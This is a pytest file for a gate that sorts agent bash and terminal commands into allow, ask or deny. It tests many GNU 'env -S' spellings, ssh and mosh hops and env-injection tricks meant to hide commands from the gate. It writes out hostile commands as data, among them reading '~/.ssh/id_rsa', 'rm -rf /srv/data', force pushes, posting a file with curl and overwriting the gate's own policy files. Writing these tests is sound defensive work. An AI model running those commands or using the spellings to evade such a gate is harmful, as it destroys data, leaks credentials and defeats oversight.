"""#591, follow-up to #634: the words of an `env -S` text are env's own argv, read as env splits them.

GNU env splits the -S (--split-string) text into words with its own rules (build_argv in coreutils' env.c: quotes,
backslash escapes, `\\_` between words, `#` at a word's start, `\\c`, ${NAME}; `;`, `&`, `|` and `>` are characters of a
word) and reads them as its own argv: options, then each word with a `=` an assignment (also after `--`), then the
command. #634 read the text's leading words as a shell line does, beside the text read as a shell line, in the
call's one reading. Main e0968a2b then (review 5665626829 of #634):
- behind an ssh hop gave the host to the new part, so the opaque_exec part lost it: `ssh host 'env -S "'X=a b' cat
  ~/.ssh/id_rsa"'` went deny -> ask under a rule that denies opaque_exec on the host, below its plain `-S` spelling;
- missed `env --split`, `-iS`, `-vS`, `-i0vS`, `-S'..'` with a `=` (cut at it) and `env -iS "rm -rf /srv/data"`;
- took a quoted NAME=value after `--` for the command, and stopped at an operator glued into the assignment
  (`'X=a b';x` is one word to env).
Now the call's first reading reads the line env runs (`_env_split_lines`), and the call is read again as before
#634 and as #634 read it (`Classification.split_readings`), so decide keeps the strictest and a part keeps the host
it had. Classification and decision only; nothing is executed.
"""
import shlex
import time

import pytest

from exo import gate
from exo.gate import OUTCOMES, binds_exact, classify, decide, normalize_policies, readings


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    (h / ".exo").mkdir(parents=True)
    (h / ".ssh").mkdir()
    monkeypatch.setenv("HOME", str(h))
    monkeypatch.setenv("EXO_HOME", str(h / ".exo"))
    for k in ("EXO_KEYS_FILE", "EXO_PRINCIPAL_STORE", "EXO_PRINCIPAL"):
        monkeypatch.delenv(k, raising=False)


def sh(command):
    return classify({"tool": "bash", "args": {"command": command}})


def term(command):
    return classify({"tool": "terminal", "args": {"command": command}})


def rule(match, decision="deny"):
    return {"gates": {"rules": [{"match": match, "decision": decision}]}}


POLICIES = {
    "default": None,
    "deny_delete": {"gates": {"deny": ["delete"]}},
    "opaque_allow": {"gates": {"categories": {"opaque_exec": "allow"}}},
    "forbid_zork": {"posting": {"forbid_words": ["Zork"]}},
}
HOP_POLICIES = {
    **POLICIES,
    "host_opaque": rule({"category": "opaque_exec", "target": "host"}),
    "host_credentials": rule({"category": "credentials", "target": "host"}),
    "host_delete": rule({"category": "delete", "target": "host"}),
    "host_any": rule({"target": "host"}),
    "opaque_deny": {"gates": {"categories": {"opaque_exec": "deny"}}},
    "reserved_terminal": {"gates": {"reserved": ["tool:terminal"]}},
    "reserved_host": {"gates": {"reserved": ["target:host"]}},
    "reserved_opaque": {"gates": {"reserved": ["opaque_exec"]}},
}


def norm(p):
    return normalize_policies(p) if p else None


def dec(line, pol):
    return decide(sh(line), norm(POLICIES[pol]))


def rank(d):
    return OUTCOMES.index(d.outcome)


def dq(s):
    """``s`` in double quotes for the outer shell."""
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"').replace("$", "\\$").replace("`", "\\`") + '"'


# The blocking rows of review 5665626829: behind an ssh hop the host stays on every part the reading before #634 gave
# it. Main e0968a2b: ask, ask, ask (and reserved 6 of 7); before #634: deny, deny, deny.
Q = "'\"'\"'"       # a single quote inside a single-quoted ssh argument
HOP_ROWS = [
    f"ssh host 'env -S \"{Q}X=a b{Q} cat ~/.ssh/id_rsa\"'",
    f"ssh host 'env -S \"{Q}X=a b{Q} rm -rf /srv/data\"'",
    f"echo 'env -S \"{Q}X=a b{Q} rm -rf /srv/data\"' | ssh host",
]


@pytest.mark.parametrize("line", HOP_ROWS)
def test_behind_a_hop_a_rule_on_the_host_still_sees_the_opaque_part(line):
    d = decide(term(line), norm(HOP_POLICIES["host_opaque"]))
    assert d.outcome == "deny", (line, d)


def test_behind_a_hop_a_reserved_entry_keeps_each_hit():
    line = f"ssh -p 22 me@host 'env -S \"{Q}X=a b{Q} $Y cat ~/.ssh/id_rsa\"'"
    d = decide(term(line), norm(HOP_POLICIES["reserved_terminal"]))
    assert ("opaque_exec", "me@host") in [tuple(r) for r in d.reserved], d.reserved
    plain = decide(term(line.replace(f"{Q}X=a b{Q} ", "")), norm(HOP_POLICIES["reserved_terminal"]))

    def hits(x, drop=""):   # a hit named after the env -S text names the assignment too, so it is dropped
        return {(a, b.replace(drop, "")) for a, b in (tuple(r) for r in x.reserved)}
    assert hits(plain) <= hits(d, "'X=a b' "), (d.reserved, plain.reserved)


def _hops(inner):
    """``inner`` behind each hop the gate reads: ssh with the line as its argument, with a user and port, mosh,
    and ssh fed it on stdin."""
    q = shlex.quote(inner)
    return [f"ssh host {q}", f"ssh -p 22 me@host {q}", f"mosh host -- {q}", f"echo {q} | ssh host"]


HOP_PAYLOADS = ["cat ~/.ssh/id_rsa", "rm -rf /srv/data", "git push --force origin main",
                "gh pr comment 6 -R myorg/app --body 'Zork leaked'", "cp /tmp/x ~/.exo/policies/x"]
HOP_MATRIX = [(h, p) for p in HOP_PAYLOADS for h in range(4)]


@pytest.mark.parametrize("hop,payload", HOP_MATRIX)
def test_behind_a_hop_no_row_decides_below_its_plain_s_spelling(hop, payload):
    line = _hops(f"env -S {dq(chr(39) + 'X=a b' + chr(39) + ' ' + payload)}")[hop]
    plain = _hops(f"env -S {dq(payload)}")[hop]
    c, p = term(line), term(plain)
    for name, pol in HOP_POLICIES.items():
        d, e = decide(c, norm(pol)), decide(p, norm(pol))
        assert rank(d) >= rank(e), (line, name, d, e)
        if d.outcome == e.outcome != "deny":
            hosted = {tuple(r) for r in e.reserved if r[1] in ("host", "me@host")}
            assert hosted <= {tuple(r) for r in d.reserved}, (line, name, d.reserved, e.reserved)


@pytest.mark.parametrize("line", HOP_ROWS)
def test_the_readings_as_before_are_kept_and_bind(line):
    c = term(line)
    assert len(c.split_readings) == 3 and all(r in readings(c) for r in c.split_readings), c.split_readings
    assert all(not r.split_readings for r in c.split_readings)
    assert binds_exact(c)
    for pol in HOP_POLICIES.values():
        assert all(rank(decide(c, norm(pol))) >= rank(decide(r, norm(pol))) for r in c.split_readings), (line, pol)


# Verify 2 of this PR: a spelling main missed, read as `-S TEXT` in the first reading, hid a nested `env -S` text that
# main read after the option word, and main's own reading (mode 1) was taken only when #634's leading words found a
# command. `env -iS'\q' sh -c 'env -S "..."'` went deny -> ask under deny: [delete], lost its reserved hit and its
# NO_GRANT. Main's reading is now taken whenever any env -S text or spelling is read. Main 58503282 decides each row
# as asserted here.
NESTED_SPELLINGS = ["-iS'\\q'", "-iStrue", "--split-s=true", "--split=", "-vS'\"'", "-i0vStrue", "--split-str=true"]
NESTED_POLICIES = {
    "deny_delete": {"gates": {"deny": ["delete"]}},
    "deny_credentials": {"gates": {"deny": ["credentials"]}},
    "reserved_delete": {"gates": {"reserved": ["delete"]}},
    "opaque_allow": {"gates": {"categories": {"opaque_exec": "allow"}}},
}


def _nested_line(spelling, payload, outer="sh"):
    return f"env {spelling} {outer} -c 'env -S \"{Q}X=a b{Q} {payload}\"'"


NESTED_ROWS = [(s, w, outer) for s in NESTED_SPELLINGS for w in ("", "sudo ") for outer in ("sh", "bash")]


@pytest.mark.parametrize("spelling,wrap,outer", NESTED_ROWS)
def test_a_missed_spelling_keeps_the_nested_text_main_read(spelling, wrap, outer):
    def nd(payload, pol):
        return decide(term(wrap + _nested_line(spelling, payload, outer)), norm(NESTED_POLICIES[pol]))
    assert nd("rm -rf /srv/data", "deny_delete").outcome == "deny", spelling
    assert nd("gh auth token", "deny_credentials").outcome == "deny", spelling
    assert ("delete", "/srv/data") in [tuple(r) for r in nd("rm -rf /srv/data", "reserved_delete").reserved]
    assert nd("rm -rf /srv/data", "opaque_allow").outcome == "ask", spelling
    assert nd("git push --force origin main", "opaque_allow").outcome == "ask", spelling


@pytest.mark.parametrize("spelling", NESTED_SPELLINGS)
def test_a_missed_spelling_keeps_the_nested_secret_out_of_a_grant(spelling):
    assert gate.no_grant(term(_nested_line(spelling, "gh auth token"))), spelling


# The spellings main e0968a2b still read as a shell line only (review 5665626829): each asked under deny: [delete]
# and was allowed under opaque_exec: allow, but for `-i0vS"..."`, `-S'..'` and `--split=..`, which it asked about.
SPELLING_ROWS = [
    "env --split \"'X=a b' rm -rf /srv/data\"",
    "env --split-str \"'X=a b' rm -rf /srv/data\"",
    "env --s \"'X=a b' rm -rf /srv/data\"",
    "env -iS \"'X=a b' rm -rf /srv/data\"",
    "env -vS \"'X=a b' rm -rf /srv/data\"",
    "env -i0vS\"'X=a b' rm -rf /srv/data\"",
    "env -0iS \"'X=a b' rm -rf /srv/data\"",
    "env -S'\"X=a b\" rm -rf /srv/data'",
    "env -iS \"rm -rf /srv/data\"",
    "env --split=\"rm -rf /srv/data\"",
]


@pytest.mark.parametrize("line", SPELLING_ROWS)
def test_each_spelling_main_missed_reads_the_command(line):
    assert dec(line, "deny_delete").outcome == "deny", line
    assert dec(line, "opaque_allow").outcome == "ask", line


# Each spelling decides at least as its `-S TEXT` spelling, bare and behind each hop, under every policy here: it
# carries the opaque part -S carries, and a reading of its text as main read -S's (classify's mode 3) gives the host
# to it as before #634 (verifier of this PR: `categories: {opaque_exec: deny}` and the host rule asked).
SPELLING_TEXTS = ["'X=a b' rm -rf /srv/data"] * 7 + ['"X=a b" rm -rf /srv/data', "rm -rf /srv/data",
                                                      "rm -rf /srv/data"]
SPELLING_MATRIX = [(n, h) for n in range(len(SPELLING_ROWS)) for h in range(5)]


@pytest.mark.parametrize("n,hop", SPELLING_MATRIX)
def test_each_spelling_decides_at_least_as_its_s_spelling(n, hop):
    row, ref = SPELLING_ROWS[n], f"env -S {shlex.quote(SPELLING_TEXTS[n])}"
    line, plain = ([row, ref] if hop == 4 else [_hops(row)[hop], _hops(ref)[hop]])
    c, p = term(line), term(plain)
    for name, pol in HOP_POLICIES.items():
        d, e = decide(c, norm(pol)), decide(p, norm(pol))
        assert rank(d) >= rank(e), (line, name, d, e)
        if d.outcome == e.outcome != "deny":
            assert {tuple(r) for r in e.reserved} <= {tuple(r) for r in d.reserved}, (line, name, d.reserved, e.reserved)


# After `--` env still reads NAME=value as an assignment (coreutils 9.4: `env -- prog= true` runs true), and env
# does not split a word on ; & | >, so `'X=a b';x` is one assignment. Main e0968a2b asked under deny: [delete] and
# allowed the opaque_allow rows.
ASSIGN_ROWS = [
    ("deny_delete", "env -S \"-- 'X=a b' rm -rf /srv/data\""),
    ("deny_delete", "env -S \"-i -- 'X=a b' Y=1 rm -rf /srv/data\""),
    ("deny_delete", "env -S \"'X=a b';x rm -rf /srv/data\""),
    ("deny_delete", "env -S \"'X=a b'&&x rm -rf /srv/data\""),
    ("deny_delete", "env -S \"'X=a b'|x rm -rf /srv/data\""),
    ("deny_delete", "env -S \"'X=a b'>x rm -rf /srv/data\""),
    ("deny_delete", "sudo env -S \"'X=a b';x rm -rf /srv/data\""),
    ("opaque_allow", "env -S \"'X=a b';x rm -rf /srv/data\""),
    ("opaque_allow", "env -S \"'X=a b';x git push --force origin main\""),
    ("opaque_allow", "env -S \"'X=a b'&&x git push --force origin main\""),
]


@pytest.mark.parametrize("pol,line", ASSIGN_ROWS)
def test_an_assignment_env_reads_does_not_hide_the_command(pol, line):
    want = "deny" if pol == "deny_delete" else "ask"
    assert dec(line, pol).outcome == want, (line, pol)


ZORK = ("gh pr comment 5 -R myorg/app --body $'ok\\nF' && "
        "env -S \"'X=a b';x gh pr comment 6 -R myorg/app --body 'Zork leaked'\"")


def test_a_forbidden_word_behind_a_glued_assignment_is_checked():
    d = dec(ZORK, "forbid_zork")
    assert d.outcome == "ask" and any("forbidden word: Zork" in v for v in d.violations), d


# Each spelling of env -S that GNU env 9.4 accepts, behind each prefix the gate reads: (the line with {} for the quoted
# text, the same command without -S with {} for its words).
SPELLINGS = [
    ("env -S {}", "env {}"),
    ("env -S{}", "env {}"),
    ("env --split-string={}", "env {}"),
    ("env --split-string {}", "env {}"),
    ("env --split {}", "env {}"),
    ("env -iS {}", "env -i {}"),
    ("env -vS {}", "env -v {}"),
    ("env -i0vS{}", "env -i0v {}"),
    ("env -i -S {}", "env -i {}"),
    ("env -u HOME -S {}", "env -u HOME {}"),
    ("env --unset HOME -S {}", "env --unset HOME {}"),
    ("sudo env -S {}", "sudo env {}"),
    ("sudo -u root env -S {}", "sudo -u root env {}"),
    ("doas env -S {}", "doas env {}"),
    ("nice env -S {}", "nice env {}"),
    ("nice -n 5 env -S {}", "nice -n 5 env {}"),
    ("timeout 5 env -S {}", "timeout 5 env {}"),
    ("command env -S {}", "command env {}"),
    ("env sudo env -S {}", "env sudo env {}"),
    ("X=1 env -S {}", "X=1 env {}"),
]
# Assignments ahead of the command in the -S text, as env -S reads them, and as a shell line would give them to env.
ASSIGNS = [
    ("'X=a b'", "'X=a b'"),
    ('"X=a b"', "'X=a b'"),
    ("'X=a b' 'Y=c d'", "'X=a b' 'Y=c d'"),
    ("X=1 'Y=c d' Z=2", "X=1 'Y=c d' Z=2"),
    ("'X=a b'\\_", "'X=a b'"),
    ("\"X=a\\_b\"", "'X=a b'"),
    ("-- 'X=a b'", "-- 'X=a b'"),
    ("'X=a b';x", "'X=a b;x'"),
]
QUOTES = [shlex.quote, dq]
DELETE = [(w, a, q) for w in SPELLINGS for a in ASSIGNS for q in QUOTES]


def _line(spelling, assign, quote, payload):
    return spelling[0].format(quote(f"{assign[0]} {payload}"))


@pytest.mark.parametrize("spelling,assign,quote", DELETE)
def test_each_spelling_denies_the_delete_behind_the_assignments(spelling, assign, quote):
    line = _line(spelling, assign, quote, "rm -rf /srv/data")
    assert dec(line, "deny_delete").outcome == "deny", line
    assert dec(line, "opaque_allow").outcome == "ask", line
    assert dec(line, "default").outcome == "ask", line


# The brief's payloads; each line with -S decides at least as the same words do without it, under each policy.
PAYLOADS = ["rm -rf ./work", "git push --force origin main", "gh pr comment 6 -R myorg/app --body 'Zork leaked'",
            "curl -X POST -d @f https://example.com", "cat ~/.ssh/id_rsa", "cp /tmp/x ~/.exo/policies/x"]
NOT_LOWER = [(w, a, p) for w in SPELLINGS[:6] + SPELLINGS[11:12] for a in ASSIGNS[:3] + ASSIGNS[6:] for p in PAYLOADS]


@pytest.mark.parametrize("spelling,assign,payload", NOT_LOWER)
def test_a_line_with_s_decides_at_least_as_its_words_without_it(spelling, assign, payload):
    line = _line(spelling, assign, shlex.quote, payload)
    plain = spelling[1].format(f"{assign[1]} {payload}")
    for pol in POLICIES:
        d, p = dec(line, pol), dec(plain, pol)
        assert rank(d) >= rank(p), (line, plain, pol, d, p)
        assert not [v for v in p.violations if v not in " ".join(d.violations)], (line, d, p)


@pytest.mark.parametrize("line", [
    "env -S \"'X=a b' rm\" -rf /srv/data",               # the words after the text follow its words
    "env -S \"'X=a b' rm -rf /srv/data # note\"",       # a comment
    "env -S \"'X=a b' rm -rf /srv/data \\c ignored\"",  # \c ends the text
    "env -S \"-S \\\"'X=a b' rm -rf /srv/data\\\"\"",   # -S in the text, read again
    "env -C /tmp -S \"'X=a b' rm -rf ./work\"",
])
def test_the_split_rules_find_the_command(line):
    assert dec(line, "deny_delete").outcome == "deny", line


# A shell expansion in the text after the command: the words env closes before it are still read, and the rest of the
# shell word stands for the rest of the text.
EXPANSIONS = ["$E", "${E}", " $(true)", " `true`"]
EXP_ROWS = [
    "env --split \"'X=a b' rm -rf /srv/data\"",
    "env -iS \"'X=a b' rm -rf /srv/data\"",
    "env -S \"'X=a b';x rm -rf /srv/data\"",
    "env -S \"-- 'X=a b' rm -rf /srv/data\"",
]


@pytest.mark.parametrize("exp", EXPANSIONS)
@pytest.mark.parametrize("line", EXP_ROWS)
def test_a_row_with_an_expansion_after_the_command_keeps_its_reading(line, exp):
    line = line[:-1] + exp + '"'
    assert dec(line, "deny_delete").outcome == "deny", line
    assert dec(line, "opaque_allow").outcome == "ask", line


# Words after an expansion in the text: env splits the expanded text, so `$BR --force` is two words and the option
# reads as without -S.
EXTRA = {
    "deny_fp": {"gates": {"deny": ["force_push"]}},
    "deny_hr": {"gates": {"deny": ["history_rewrite"]}},
}
AFTER = [
    ("env -S \"'X=a b' git push origin $BR --force\"", "env 'X=a b' git push origin $BR --force", "deny_fp"),
    ("env --split \"'X=a b' git push origin $BR -f\"", "env 'X=a b' git push origin $BR -f", "deny_fp"),
    ("env -iS \"'X=a b' git push origin $(git branch --show-current) --force\"",
     "env -i 'X=a b' git push origin $(git branch --show-current) --force", "deny_fp"),
    ("env -S \"-- 'X=a b' find /srv/$D -delete\"", "env -- 'X=a b' find /srv/$D -delete", "deny_delete"),
    ("env -S \"'X=a b';x git reset $E --hard\"", "env 'X=a b;x' git reset $E --hard", "deny_hr"),
]


def dec_any(line, pol):
    return decide(sh(line), norm({**POLICIES, **EXTRA}[pol]))


@pytest.mark.parametrize("line,plain,pol", AFTER)
def test_a_word_after_an_expansion_reads_as_without_s(line, plain, pol):
    assert dec_any(line, pol).outcome == "deny", line
    assert dec_any(line, "opaque_allow").outcome == "ask", line
    for p in list(POLICIES) + list(EXTRA):
        assert rank(dec_any(line, p)) >= rank(dec_any(plain, p)), (line, plain, p)


@pytest.mark.parametrize("name,line,plain,prog", [
    ("LD_PRELOAD", "env --split \"'LD_PRELOAD=/tmp/x.so' ls\"", "env 'LD_PRELOAD=/tmp/x.so' ls", "ls"),
    ("PATH", "env -iS \"'PATH=/tmp/evil:/usr/bin' git status\"", "env -i 'PATH=/tmp/evil:/usr/bin' git status",
     "git status"),
    ("BASH_ENV", "env -S \"-- 'BASH_ENV=/tmp/x' bash -c true\"", "env -- 'BASH_ENV=/tmp/x' bash -c true", "true"),
])
def test_an_env_inject_name_in_the_text_reads_as_without_s(name, line, plain, prog):
    c = sh(line)
    assert any(p.summary.startswith(name) for p in gate._each_part(c)), (line, c)
    assert any(p.category == "read" and p.summary == prog for p in gate._each_part(c)), (line, c)
    for pol in POLICIES:
        assert rank(dec(line, pol)) >= rank(dec(plain, pol)), (line, pol)


# Guard rows: what main read right stays.
def test_a_plain_text_reads_its_command():
    c = sh("env -S 'ls -l'")
    assert any(p.category == "read" and p.summary == "ls" for p in gate._each_part(c)), c
    assert [dec("env -S 'ls -l'", p).outcome for p in POLICIES] == ["ask", "ask", "allow", "ask"]


def test_env_without_s_is_unchanged():
    c = sh("env FOO=1 ls")
    assert c.category == "read" and not getattr(c, "split_readings", [])
    assert all(dec("env FOO=1 ls", p).outcome == "allow" for p in POLICIES)


@pytest.mark.parametrize("line", [
    "env -S \"'X=a b' rm -rf /srv/data\"",
    "sudo env -S \"'X=a b' rm -rf /srv/data\"",
    "env -S \"X=a rm -rf /srv/data\"",
    "env -S \"'X=a b' && rm -rf /srv/data\"",
    "env -uS rm -rf /srv/data",                  # -u takes S for its value: rm is env's command
])
def test_the_rows_main_denies_stay_denied(line):
    assert dec(line, "deny_delete").outcome == "deny", line


# GNU env runs no command then and prints the environment.
@pytest.mark.parametrize("line", ["env -S 'X=1 Y=2'", "env -S \"'X=a b' 'Y=c d'\"", "env -S ''", "env --split 'X=1'"])
def test_a_text_of_assignments_only_asks(line):
    assert all(dec(line, p).outcome == "ask" for p in POLICIES), line


@pytest.mark.parametrize("line", ["env -S 'frobnicate --x'", "env -S \"'X=a b' frobnicate --x\"",
                                  "env -S \"-- 'X=a b' frobnicate rm -rf /srv/data\""])
def test_an_unknown_program_in_the_text_still_asks(line):
    assert "unknown program" in sh(line).signals
    assert dec(line, "default").outcome == "ask" and dec(line, "deny_delete").outcome == "ask"


@pytest.mark.parametrize("line,main", [
    ("env -S \"'X=a b rm -rf /srv/data\"", "opaque_exec"),               # an unclosed quote: env refuses the text
    ("env -S \"'X=a b' rm -rf /srv/data \\q\"", "delete"),               # an unknown escape
    ("env -S \"'X=a b' rm -rf /srv/data \\$X\"", "delete"),              # $ not in ${NAME}
    ("env -S \"$CMD\"", "opaque_exec"),                                  # the text from a variable
    ("env -S \"'X=a b $E' rm -rf /srv/data\"", "delete"),                # no word closes before the expansion
    ("env -S \"'X=a b' muse login \\$HOME\"", "credentials"),
])
def test_an_unsure_split_adds_no_line(line, main):
    # env runs nothing, or the whole text comes from a variable: no line is added, and the readings as before stand
    # (#634's reads the text's words as a shell line does, so it finds `rm` behind `\q`), each with main's category
    # (e0968a2b's, for the bypass floor too).
    words = [t[1] for t in gate._Lexer(line).run() if t[0] == "w"]
    assert gate._env_split_lines(words) == [], line
    assert main in [r.category for r in readings(sh(line))] and dec(line, "default").outcome == "ask", line


@pytest.mark.parametrize("line", [
    "env -S '${CMD} -rf /srv/data'",                    # the command from env's environment
    "env -S \"'X=a b' $CMD -rf /srv/data\"",            # the command from a shell variable
    "env -S \"'X=a b' rm$E -rf /srv/data\"",            # an expansion in the command word
    "env -S \"'X=a b' \\${CMD} -rf /srv/data\"",
])
def test_a_program_from_a_variable_stays_opaque(line):
    assert sh(line).category == "opaque_exec", line
    assert dec(line, "default").outcome == "ask" and dec(line, "deny_delete").outcome == "ask", line


# env.c's split, word by word, quoted for a shell line (each checked against GNU env 9.4 with printf).
@pytest.mark.parametrize("text,words", [
    ("'X=a b' rm -rf /srv/data", ["'X=a b'", "rm", "-rf", "/srv/data"]),
    ('"X=a b" rm', ["'X=a b'", "rm"]),
    ("'X=a b';x rm", ["'X=a b;x'", "rm"]),
    ("a&&b|c>d", ["'a&&b|c>d'"]),
    ("a\\_b", ["a", "b"]),
    ('"a\\_b"', ["'a b'"]),
    ("a #c d", ["a"]),
    ("a#c", ["'a#c'"]),
    ("a \\c b", ["a"]),
    ("'a\\_b'", ["'a\\_b'"]),
    ("'q\\'s' 'b\\\\s'", ["'q'\"'\"'s'", "'b\\s'"]),
    ("\\$X \\#", ["'$X'", "'#'"]),
    ("a\\tb", ["'a\tb'"]),
    ("${HOME}/x", ['"${HOME}"/x']),
    ("${X}", ["${X}"]),
    ("'${X}'", ["'${X}'"]),
    ("''", ["''"]),
    ("", []),
    ("'a", None),
    ('"a', None),
    ("a \\q", None),
    ("$X", None),
    ("${1}", None),
    ('"a\\c"', None),
    ("a\\", None),
    ("${X}#a", None),
])
def test_env_split(text, words):
    assert gate._env_split(text) == words


@pytest.mark.parametrize("line,split", [
    ("env --split \"'X=a b' rm\"", ["env 'X=a b' rm"]),
    ("env --split-string \"'X=a b' rm\"", ["env 'X=a b' rm"]),
    ("env -S'\"X=a b\" rm'", ["env 'X=a b' rm"]),
    ("env --split-string='X=1 rm'", ["env X=1 rm"]),
    ("env -i0vS'rm -f x'", ["env -i0v rm -f x"]),
    ("sudo env -iS \"-- 'X=a b' rm\" -v", ["sudo env -i -- 'X=a b' rm -v"]),
    ("env -uS rm", []),
    ("env -iu S -S rm", ["env -iu S rm"]),
    ("env -- -S rm", []),
    ("env -S \"'X=a b' rm -rf /srv/data$E\"", ["env 'X=a b' rm -rf /srv/data\"$E\""]),
    ("env -S \"'X=a b' git push origin $BR --force\"",
     ["env 'X=a b' git push origin \"$BR --force\"", "env 'X=a b' git push origin \"$BR\" --force"]),
    ("env -S \"$CMD\"", []),
])
def test_the_line_env_runs(line, split):
    words = [t[1] for t in gate._Lexer(line).run() if t[0] == "w"]
    assert gate._env_split_lines(words) == split


def _cpu(fn, args):
    """CPU seconds ``fn`` takes on each of ``args``; three tries, so load cannot fail a linear bound."""
    for _ in range(3):
        took = []
        for a in args:
            start = time.process_time()
            fn(a)
            took.append(time.process_time() - start)
        if took[1] < 8 * took[0] + 0.3:
            break
    return took


@pytest.mark.parametrize("shape", [
    lambda n: ("a" * n, ""),
    lambda n: ("'" + "a" * n + "'", ""),
    lambda n: ('"' + "a" * n + '"', ""),
    lambda n: ("rm " + "a" * n, '"$E"'),
])
def test_env_split_is_linear_in_a_long_word(shape):
    took = _cpu(lambda a: gate._env_split(*a), [shape(n) for n in (100_000, 400_000)])
    assert took[1] < 8 * took[0] + 0.3, took


@pytest.mark.parametrize("make", [
    lambda n: "env -S " + dq("'X=a b';x rm -rf " + " ".join(["/srv/d"] * n)),
    lambda n: "env --split " + dq("-- 'X=a b' echo " + "a" * (40 * n)),
])
def test_classify_is_linear_in_the_text(make):
    took = _cpu(lambda line: sh(line), [make(n) for n in (250, 1000)])
    assert took[1] < 8 * took[0] + 0.3, took


def _nested(depth):
    line = "rm -rf /srv/data"
    for _ in range(depth):
        line = "env -S " + dq("'X=a b' " + line)
    return line


def test_classify_stays_cheap_in_nesting():
    # Each level reads its text as a shell line and as env's argv, the call as before #634 and as #634 read it; the
    # gate reads _DEPTH levels and no more, so a nest of any depth costs a bounded number of readings.
    start = time.process_time()
    c = sh(_nested(12))
    assert time.process_time() - start < 20, "nested env -S took too long"
    assert c.category in ("delete", "opaque_exec")
    assert decide(sh(_nested(2)), norm(POLICIES["deny_delete"])).outcome == "deny"
